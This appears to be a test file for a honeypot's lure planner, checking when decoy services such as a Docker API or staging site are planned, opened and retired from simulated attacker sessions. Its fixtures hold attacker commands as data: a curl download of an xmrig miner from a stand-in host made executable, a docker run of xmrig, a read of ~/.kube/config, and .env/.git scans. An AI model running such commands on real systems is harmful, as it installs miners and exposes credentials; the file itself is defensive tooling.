import { describe, expect, test } from "bun:test";
import { mkdtempSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { derive, planLures } from "../apps/api/src/chronicle";
import { approve, close, PLANNER, plan, reconcileAnnex, suggestions, wantedLures } from "../apps/api/src/planner";
import {
  foldChronicle,
  lureById,
  lureServiceKey,
  LURES,
  type AnalyticsSession,
  type ChronicleEvent,
  type HoneypotService,
  type IntelSnapshot,
} from "../packages/shared/src/index";

const NOW = 1_800_000_000_000;
const HOUR = 3_600_000;

const CORE: HoneypotService[] = [
  { file: "ssh.yaml", protocol: "SSH", address: ":2222", description: "SSH interactive" },
  { file: "http.yaml", protocol: "HTTP", address: ":8080", description: "WordPress 6.9.4" },
];
const docker = lureById("docker-api")!;
const DOCKER_SERVICE: HoneypotService = { file: "docker-api.yaml", protocol: docker.protocol, address: docker.address, description: docker.description };

const EMPTY_INTEL: IntelSnapshot = {
  sessions: {},
  analyses: {},
  brief: null,
  stats: { enabled: false, model: "", analyzed: 0, triaged: 0, queued: 0, budgetUsed: 0, budgetPerHour: 0 },
};

function session(over: Partial<AnalyticsSession> & { key: string }): AnalyticsSession {
  return {
    protocol: "SSH",
    service: "SSH interactive",
    ip: "203.0.113.1",
    country: "",
    user: "root",
    client: "",
    start: NOW - 60_000,
    end: NOW - 30_000,
    status: { kind: "merged", label: "Closed" },
    creds: [],
    interactions: [],
    events: [],
    ...over,
  };
}

const said = (input: string) => [{ input, output: "", time: NOW }];

/** `n` miners from different addresses, each dropping xmrig through the fake shell. */
const miners = (n: number, end = NOW - 30_000) =>
  Array.from({ length: n }, (_, i) =>
    session({ key: `m${i}|${end}`, ip: `198.51.100.${i + 1}`, end, interactions: said("curl -s http://x/xmrig -o /tmp/x; chmod +x /tmp/x") }),
  );

/** One chronicle tick, the way the API runs it: derive, then plan on the result. */
function tick(ledger: ChronicleEvent[], facts: { now?: number; sessions?: AnalyticsSession[]; services?: HoneypotService[] } = {}) {
  let n = ledger.length;
  const id = () => `e${++n}`;
  const f = { now: facts.now ?? NOW, sessions: facts.sessions ?? [], services: facts.services ?? CORE, intel: EMPTY_INTEL };
  const derived = derive(foldChronicle(ledger), f, id);
  const planned = planLures(foldChronicle([...ledger, ...derived]), f, id);
  const next = [...ledger, ...derived, ...planned];
  return { fresh: [...derived, ...planned], next, state: foldChronicle(next) };
}

const types = (events: ChronicleEvent[]) => events.map((e) => e.type);

describe("city planner", () => {
  test("ignores demand that is too thin, then builds the lure it asks for", () => {
    const founded = tick([]).next;
    // Two miners are a coincidence.
    expect(types(tick(founded, { sessions: miners(2) }).fresh).filter((t) => t.startsWith("lure"))).toEqual([]);

    // Three, each worth 4, is a trend.
    const built = tick(founded, { sessions: miners(3) });
    const planned = built.fresh.find((e) => e.type === "lure.planned");
    expect(planned).toMatchObject({ lure: "docker-api", ips: 3, sessions: 3, key: lureServiceKey(docker) });
    expect(planned && planned.type === "lure.planned" && planned.signals[0]).toBe("Cryptominer drops");
    expect(built.state.lures["docker-api"].status).toBe("planned");
    expect(wantedLures(built.state)).toEqual(["docker-api"]);
  });

  test("explains itself with the inputs that asked for the lure", () => {
    const founded = tick([]).next;
    const scans = [1, 2, 3].map((i) =>
      session({
        key: `w${i}`,
        ip: `192.0.2.${i}`,
        protocol: "HTTP",
        service: "WordPress 6.9.4",
        interactions: [...said("GET /"), ...said("GET /.git/config")],
      }),
    );
    const planned = tick(founded, { sessions: scans }).fresh.find((e) => e.type === "lure.planned");
    expect(planned).toMatchObject({ lure: "staging-site", reason: ".env and .git scans from 3 addresses", samples: ["GET /.git/config"] });
  });

  test("one address cannot build a lure on its own, however loud", () => {
    const founded = tick([]).next;
    const loud = Array.from({ length: 30 }, (_, i) =>
      session({ key: `l${i}`, ip: "198.51.100.9", interactions: said("docker run -d xmrig") }),
    );
    expect(tick(founded, { sessions: loud }).fresh.filter((e) => e.type === "lure.planned")).toEqual([]);
  });

  test("a lure opens only once the honeypot serves it, and its first catch is a discovery", () => {
    let ledger = tick([]).next;
    ledger = tick(ledger, { sessions: miners(3) }).next;

    // The honeypot picked it up: the service appears, and the lure is open.
    const later = NOW + 10_000;
    const opened = tick(ledger, { now: later, sessions: miners(3), services: [...CORE, DOCKER_SERVICE] });
    expect(opened.fresh.find((e) => e.type === "service.exposed")).toMatchObject({ lure: "docker-api" });
    expect(opened.state.lures["docker-api"]).toMatchObject({ status: "open", openedAt: later });
    expect(opened.state.services[lureServiceKey(docker)].lure).toBe("docker-api");

    // Traffic on the lure itself is a catch, not more demand.
    const catchAt = later + 60_000;
    const hit = session({ key: "d1", protocol: "HTTP", service: docker.description, end: catchAt, interactions: said("GET /containers/json") });
    const caught = tick(opened.next, { now: catchAt + 1000, sessions: [...miners(3), hit], services: [...CORE, DOCKER_SERVICE] });
    expect(types(caught.fresh)).toContain("service.discovered");
    expect(caught.state.services[lureServiceKey(docker)].discoveredAt).toBe(catchAt);
  });

  test("a catch that lands before the chronicle notices the opening still counts", () => {
    let ledger = tick([]).next;
    ledger = tick(ledger, { sessions: miners(3) }).next;
    // The annex served it at NOW + 5s; the next tick only records the exposure at NOW + 15s.
    const early = session({ key: "d0", protocol: "HTTP", service: docker.description, end: NOW + 5_000, interactions: said("GET /_ping") });
    ledger = tick(ledger, { now: NOW + 15_000, sessions: [...miners(3), early], services: [...CORE, DOCKER_SERVICE] }).next;
    const after = tick(ledger, { now: NOW + 30_000, sessions: [...miners(3), early], services: [...CORE, DOCKER_SERVICE] });
    expect(after.state.services[lureServiceKey(docker)].discoveredAt).toBeDefined();
  });

  test("grows one building at a time, and never past capacity", () => {
    let ledger = tick([]).next;
    const everything = [
      ...miners(3),
      ...[1, 2, 3].map((i) => session({ key: `env${i}`, ip: `192.0.2.${i}`, protocol: "HTTP", service: "WordPress 6.9.4", interactions: said("GET /.env") })),
      ...[1, 2, 3].map((i) => session({ key: `pg${i}`, ip: `192.0.2.${10 + i}`, creds: [{ user: "postgres", password: "postgres" }] })),
      ...[1, 2, 3].map((i) => session({ key: `k${i}`, ip: `192.0.2.${20 + i}`, interactions: said("cat ~/.kube/config") })),
      ...[1, 2, 3].map((i) => session({ key: `o${i}`, ip: `192.0.2.${30 + i}`, protocol: "HTTP", service: "WordPress 6.9.4", interactions: said("GET /api/tags") })),
    ];
    const first = tick(ledger, { sessions: everything });
    expect(first.fresh.filter((e) => e.type === "lure.planned")).toHaveLength(1);
    // Right after, the planner waits.
    expect(tick(first.next, { now: NOW + 60_000, sessions: everything }).fresh.filter((e) => e.type === "lure.planned")).toEqual([]);

    // Each gap builds one more, the honeypot serves it, and the city stops growing at capacity.
    ledger = first.next;
    let at = NOW;
    for (let i = 0; i < 6; i++) {
      at += PLANNER.gap;
      const served = wantedLures(foldChronicle(ledger)).map((id) => {
        const l = lureById(id)!;
        return { file: `${id}.yaml`, protocol: l.protocol, address: l.address, description: l.description };
      });
      ledger = tick(ledger, { now: at, sessions: everything.map((s) => ({ ...s, end: at - 30_000 })), services: [...CORE, ...served] }).next;
    }
    const lures = Object.values(foldChronicle(ledger).lures);
    expect(lures.filter((l) => l.status !== "retired")).toHaveLength(PLANNER.capacity);
    expect(lures.filter((l) => l.status === "open")).toHaveLength(PLANNER.capacity);
  });

  test("closes a lure that catches nothing, and only reopens it on fresh demand after a cooldown", () => {
    let ledger = tick([]).next;
    ledger = tick(ledger, { sessions: miners(3) }).next;
    ledger = tick(ledger, { now: NOW + 10_000, sessions: miners(3), services: [...CORE, DOCKER_SERVICE] }).next;

    const idle = NOW + 10_000 + PLANNER.idle + HOUR;
    const closed = tick(ledger, { now: idle, sessions: miners(3), services: [...CORE, DOCKER_SERVICE] });
    expect(closed.fresh.find((e) => e.type === "lure.retired")).toMatchObject({ lure: "docker-api", reason: "Caught nothing in 3 days" });
    expect(wantedLures(closed.state)).toEqual([]);

    // The annex dropped it: the service is withdrawn.
    ledger = tick(closed.next, { now: idle + 10_000, sessions: miners(3) }).next;
    expect(foldChronicle(ledger).services[lureServiceKey(docker)].withdrawnAt).toBe(idle + 10_000);

    // The old demand was already answered; it does not reopen the lure.
    const later = idle + PLANNER.cooldown + HOUR;
    expect(tick(ledger, { now: later, sessions: miners(3) }).fresh.filter((e) => e.type === "lure.planned")).toEqual([]);

    // New miners after it closed do, once the cooldown is over.
    const reopened = tick(ledger, { now: later, sessions: [...miners(3), ...miners(3, later - 60_000)] });
    expect(reopened.state.lures["docker-api"]).toMatchObject({ status: "planned", generation: 2 });

    // Coming back, the service starts over instead of inheriting its first life.
    const back = tick(reopened.next, { now: later + 10_000, sessions: miners(3, later - 60_000), services: [...CORE, DOCKER_SERVICE] });
    const service = back.state.services[lureServiceKey(docker)];
    expect(service.withdrawnAt).toBeUndefined();
    expect(service.discoveredAt).toBeUndefined();
    expect(back.state.lures["docker-api"].status).toBe("open");
  });

  test("gives up on a lure the honeypot never serves", () => {
    let ledger = tick([]).next;
    ledger = tick(ledger, { sessions: miners(3) }).next;
    const stalled = tick(ledger, { now: NOW + PLANNER.stalled + 1000, sessions: miners(3) });
    expect(stalled.fresh.find((e) => e.type === "lure.retired")).toMatchObject({ reason: "The honeypot never came to serve it" });
  });

  test("replays the city as it grew", () => {
    let ledger = tick([]).next;
    ledger = tick(ledger, { sessions: miners(3) }).next;
    ledger = tick(ledger, { now: NOW + 10_000, sessions: miners(3), services: [...CORE, DOCKER_SERVICE] }).next;
    expect(foldChronicle(ledger, NOW - 1).lures).toEqual({});
    expect(foldChronicle(ledger, NOW).lures["docker-api"].status).toBe("planned");
    expect(foldChronicle(ledger, NOW + 10_000).lures["docker-api"].status).toBe("open");
  });
});

describe("propose mode", () => {
  const facts = (sessions: AnalyticsSession[], now = NOW) => ({ now, sessions, analysisOf: () => undefined });

  test("suggests instead of building, and an operator applies it", () => {
    const state = tick([]).state;
    expect(plan(state, facts(miners(3)), "propose")).toEqual([]);
    expect(suggestions(state, facts(miners(3))).map((d) => d.lure.id)).toEqual(["docker-api"]);

    const draft = approve(state, facts(miners(3)), "docker-api");
    expect(draft).toMatchObject({ type: "lure.planned", lure: "docker-api", ips: 3 });
  });

  test("applying is held to the planner's own rules", () => {
    const founded = tick([]);
    // Not enough demand: nothing to apply.
    expect(approve(founded.state, facts(miners(2)), "docker-api")).toEqual({ error: "Not a current suggestion" });
    expect(approve(founded.state, facts(miners(3)), "not-a-lure")).toEqual({ error: "Not a current suggestion" });
    // Already standing: no second copy.
    const built = tick(founded.next, { sessions: miners(3) });
    expect(approve(built.state, facts(miners(3)), "docker-api")).toEqual({ error: "Not a current suggestion" });
  });

  test("an operator can close a lure, and reopen it right away on the same demand", () => {
    const built = tick(tick([]).next, { sessions: miners(3) });
    expect(close(built.state, "postgres")).toEqual({ error: "That lure is not standing" });

    const draft = close(built.state, "docker-api");
    expect(draft).toMatchObject({ type: "lure.retired", lure: "docker-api", manual: true });
    const closed = [...built.next, { id: "x1", at: NOW + 1000, ...(draft as object) } as ChronicleEvent];
    expect(wantedLures(foldChronicle(closed))).toEqual([]);

    // Not a failure: no cooldown, and the demand that asked for it still counts.
    const later = facts(miners(3), NOW + 2000);
    expect(suggestions(foldChronicle(closed), later).map((d) => d.lure.id)).toEqual(["docker-api"]);
    expect(approve(foldChronicle(closed), later, "docker-api")).toMatchObject({ type: "lure.planned" });
  });

  test("still closes idle lures on its own", () => {
    let ledger = tick([]).next;
    ledger = tick(ledger, { sessions: miners(3) }).next;
    ledger = tick(ledger, { now: NOW + 10_000, sessions: miners(3), services: [...CORE, DOCKER_SERVICE] }).next;
    const later = NOW + 10_000 + PLANNER.idle + HOUR;
    expect(plan(foldChronicle(ledger), facts(miners(3), later), "propose").map((d) => d.type)).toEqual(["lure.retired"]);
  });
});

describe("annex reconciliation", () => {
  const blueprints = join(import.meta.dir, "../apps/honeypot/config/lures");

  test("holds exactly the wanted lures, and only rewrites what changed", () => {
    const annex = mkdtempSync(join(tmpdir(), "annex-"));
    writeFileSync(join(annex, "stale.yaml"), "x");
    expect(reconcileAnnex(["docker-api", "postgres"], { blueprints, annex })).toBe(true);
    expect(readdirSync(annex).sort()).toEqual(["docker-api.yaml", "postgres.yaml"]);
    expect(readFileSync(join(annex, "postgres.yaml"), "utf8")).toBe(readFileSync(join(blueprints, "postgres.yaml"), "utf8"));
    // Every change restarts the annex, so a no-op must stay a no-op.
    expect(reconcileAnnex(["docker-api", "postgres"], { blueprints, annex })).toBe(false);
    expect(reconcileAnnex(["postgres"], { blueprints, annex })).toBe(true);
    expect(readdirSync(annex)).toEqual(["postgres.yaml"]);
  });

  test("every lure in the catalog has a config that matches it", () => {
    for (const lure of LURES) {
      const text = readFileSync(join(blueprints, `${lure.id}.yaml`), "utf8");
      const field = (key: string) => text.match(new RegExp(`^${key}:\\s*["']?(.*?)["']?\\s*$`, "m"))?.[1] ?? "";
      expect({ protocol: field("protocol").toUpperCase(), address: field("address"), description: field("description") }).toEqual({
        protocol: lure.protocol,
        address: lure.address,
        description: lure.description,
      });
    }
  });
});

